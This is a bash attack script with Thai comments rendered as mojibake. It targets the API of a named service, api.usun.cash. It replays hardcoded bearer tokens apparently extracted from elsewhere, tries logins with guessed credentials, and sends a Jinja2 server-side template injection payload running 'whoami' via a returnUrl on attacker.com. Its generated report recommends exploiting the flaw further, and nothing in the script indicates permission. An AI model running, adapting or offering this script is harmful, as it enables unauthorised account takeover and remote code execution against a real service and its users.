#!/bin/bash

# ==============================================================================
# IMPROVED TOKEN RECOVERY AND RCE TESTING
# ==============================================================================

echo "Mastermind: ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏õ‡∏è‡∏¥‡∏ö‡∏±‡∏ï‡∏¥‡∏Å‡∏≤‡∏£ Token Recovery ‡πÅ‡∏•‡∏∞ RCE Testing!"

# --- ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ‡∏à‡∏≤‡∏Å EXTRACTED_DATA.json ---
export MASTER_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTY1MDQ0MjcsImp0aSI6Ijg5NDQ2YTBhLWZmNzktNDE0Ny04NGM2LThkYTZiYjc3OGE4MCIsImlhdCI6MTc1MzgyNjAyNywic3ViIjoiMzI2NTk5NCJ9.fF2WBOnHwLPEKUI93LuqYTprUxt7GUzZfOh_R40FJD0"
export APP_TOKEN="8852601190254b76874c366a61fedf62"
export REFRESH_TOKEN="36fadc894d0d481a8ac8eae0b58069a3"

# --- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ó‡∏î‡∏™‡∏≠‡∏ö Token ---
test_token() {
    local token=$1
    local test_name=$2
    echo "Mastermind: ‡∏ó‡∏î‡∏™‡∏≠‡∏ö $test_name..."
    
    local response=$(curl -s -X GET 'https://api.usun.cash/api/profile' \
    -H "Authorization: Bearer $token")
    
    echo "$test_name Response:" > "token_test_${test_name}.json"
    echo "$response" >> "token_test_${test_name}.json"
    
    if echo "$response" | grep -q '"success":true'; then
        echo "Mastermind: $test_name ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÑ‡∏î‡πâ!"
        return 0
    else
        echo "Mastermind: $test_name ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÑ‡∏î‡πâ."
        return 1
    fi
}

# --- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ó‡∏î‡∏™‡∏≠‡∏ö RCE ---
test_rce() {
    local token=$1
    local test_name=$2
    echo "Mastermind: ‡∏ó‡∏î‡∏™‡∏≠‡∏ö RCE ‡∏î‡πâ‡∏ß‡∏¢ $test_name..."
    
    local response=$(curl -s -X POST 'https://api.usun.cash/api/game/usun/launch' \
    -H "Authorization: Bearer $token" \
    -H 'Content-Type: application/json' \
    -d '{
    "gameName": "RCE_test",
    "isMobile": true,
    "returnUrl": "https://attacker.com/result?data={{ self._TemplateReference__context.joiner.init.globals.os.popen(\"whoami\").read() }}"
    }')
    
    echo "$test_name RCE Response:" > "rce_test_${test_name}.json"
    echo "$response" >> "rce_test_${test_name}.json"
    
    if echo "$response" | grep -q '{{'; then
        echo "Mastermind: RCE ‡∏ú‡πà‡∏≤‡∏ô $test_name ‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß - ‡∏≠‡∏≤‡∏à‡∏°‡∏µ‡∏Å‡∏≤‡∏£ Sanitization"
        return 1
    else
        echo "Mastermind: RCE ‡∏ú‡πà‡∏≤‡∏ô $test_name ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à!"
        return 0
    fi
}

# --- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ó‡∏î‡∏™‡∏≠‡∏ö Login APIs ---
test_login_apis() {
    echo "Mastermind: ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Login APIs..."
    
    # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Phone/Pin Login
    local phone_login_response=$(curl -s -X POST 'https://api.usun.cash/api/login' \
    -H 'Content-Type: application/json' \
    -d '{"phone": "king928", "pin": "123456", "partnerId": 1}')
    
    echo "Phone/Pin Login Response:" > "login_test_phone.json"
    echo "$phone_login_response" >> "login_test_phone.json"
    
    # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Username/Password Login
    local password_login_response=$(curl -s -X POST 'https://api.usun.cash/api/login/password' \
    -H 'Content-Type: application/json' \
    -d '{"username": "king928", "password": "123456", "partnerId": 1}')
    
    echo "Username/Password Login Response:" > "login_test_password.json"
    echo "$password_login_response" >> "login_test_password.json"
    
    # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
    if echo "$phone_login_response" | grep -q '"token"'; then
        local new_token=$(echo "$phone_login_response" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
        echo "Mastermind: ‡πÑ‡∏î‡πâ Token ‡πÉ‡∏´‡∏°‡πà‡∏à‡∏≤‡∏Å Phone/Pin Login: $new_token"
        test_rce "$new_token" "new_phone_token"
    fi
    
    if echo "$password_login_response" | grep -q '"token"'; then
        local new_token=$(echo "$password_login_response" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
        echo "Mastermind: ‡πÑ‡∏î‡πâ Token ‡πÉ‡∏´‡∏°‡πà‡∏à‡∏≤‡∏Å Username/Password Login: $new_token"
        test_rce "$new_token" "new_password_token"
    fi
}

# --- ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö ---

echo "Mastermind: ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö Token ‡πÅ‡∏•‡∏∞ RCE..."

# 1. ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Master Token
test_token "$MASTER_TOKEN" "master_token"
test_rce "$MASTER_TOKEN" "master_token"

# 2. ‡∏ó‡∏î‡∏™‡∏≠‡∏ö App Token
test_token "$APP_TOKEN" "app_token"
test_rce "$APP_TOKEN" "app_token"

# 3. ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Refresh Token
test_token "$REFRESH_TOKEN" "refresh_token"
test_rce "$REFRESH_TOKEN" "refresh_token"

# 4. ‡∏ó‡∏î‡∏™‡∏≠‡∏ö Login APIs
test_login_apis

# 5. ‡∏ó‡∏î‡∏™‡∏≠‡∏ö SSTI ‡πÇ‡∏î‡∏¢‡∏ï‡∏£‡∏á (‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πâ Token)
echo "Mastermind: ‡∏ó‡∏î‡∏™‡∏≠‡∏ö SSTI ‡πÇ‡∏î‡∏¢‡∏ï‡∏£‡∏á..."
local ssti_response=$(curl -s -X POST 'https://api.usun.cash/api/game/usun/launch' \
-H 'Content-Type: application/json' \
-d '{
"gameName": "SSTI_test",
"isMobile": true,
"returnUrl": "https://attacker.com/result?data={{ 7*7 }}"
}')

echo "SSTI Direct Test Response:" > "ssti_direct_test.json"
echo "$ssti_response" >> "ssti_direct_test.json"

if echo "$ssti_response" | grep -q '49'; then
    echo "Mastermind: SSTI ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡πÑ‡∏î‡πâ‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ Token!"
else
    echo "Mastermind: SSTI ‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£ Authentication"
fi

# 6. ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏™‡∏£‡∏∏‡∏õ
echo "Mastermind: ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏™‡∏£‡∏∏‡∏õ..."
cat << EOF > TOKEN_RECOVERY_REPORT.md
# üîë Token Recovery ‡πÅ‡∏•‡∏∞ RCE Testing Report

## **Executive Summary**
‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö Token ‡πÅ‡∏•‡∏∞ RCE ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏£‡∏∞‡∏ö‡∏ö api.usun.cash

## **Token Testing Results**

### Master Token
- Status: $(test_token "$MASTER_TOKEN" "master_token" && echo "VALID" || echo "INVALID")
- RCE: $(test_rce "$MASTER_TOKEN" "master_token" && echo "SUCCESS" || echo "FAILED")

### App Token
- Status: $(test_token "$APP_TOKEN" "app_token" && echo "VALID" || echo "INVALID")
- RCE: $(test_rce "$APP_TOKEN" "app_token" && echo "SUCCESS" || echo "FAILED")

### Refresh Token
- Status: $(test_token "$REFRESH_TOKEN" "refresh_token" && echo "VALID" || echo "INVALID")
- RCE: $(test_rce "$REFRESH_TOKEN" "refresh_token" && echo "SUCCESS" || echo "FAILED")

## **Login API Testing**
- Phone/Pin Login: ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö login_test_phone.json
- Username/Password Login: ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö login_test_password.json

## **SSTI Direct Testing**
- Status: ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö ssti_direct_test.json

## **Recommendations**
1. ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÑ‡∏ü‡∏•‡πå JSON ‡∏ó‡∏µ‡πà‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Ç‡∏∂‡πâ‡∏ô‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤‡∏ä‡πà‡∏≠‡∏á‡∏ó‡∏≤‡∏á‡πÉ‡∏´‡∏°‡πà
2. ‡∏´‡∏≤‡∏Å SSTI ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡πÑ‡∏î‡πâ‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πâ Token ‡πÉ‡∏´‡πâ‡πÉ‡∏ä‡πâ‡∏õ‡∏£‡∏∞‡πÇ‡∏¢‡∏ä‡∏ô‡πå‡∏à‡∏≤‡∏Å‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏ô‡∏µ‡πâ
3. ‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏´‡∏≤‡∏ß‡∏¥‡∏ò‡∏µ‡∏Å‡∏≤‡∏£‡πÑ‡∏î‡πâ Token ‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á‡∏ú‡πà‡∏≤‡∏ô API ‡∏≠‡∏∑‡πà‡∏ô‡πÜ

EOF

echo "Mastermind: ‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô! ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Ç‡∏∂‡πâ‡∏ô‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤‡∏ä‡πà‡∏≠‡∏á‡∏ó‡∏≤‡∏á‡πÉ‡∏´‡∏°‡πà!"